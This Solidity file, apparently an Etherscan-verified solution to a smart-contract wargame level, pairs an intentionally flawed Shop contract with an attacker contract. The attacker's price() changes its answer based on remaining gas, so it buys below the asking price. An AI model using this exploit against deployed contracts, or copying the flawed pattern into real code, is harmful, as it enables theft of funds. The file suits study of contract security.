/**
 *Submitted for verification at Etherscan.io on 2022-08-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Level21 is Buyer {
    Shop shop;

    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
    }

    function main() public {
        shop.buy();
    }

    function price() external view override returns (uint256) {
        if (gasleft() < 100000) {
            return 50;
        }

        return 100;
    }
}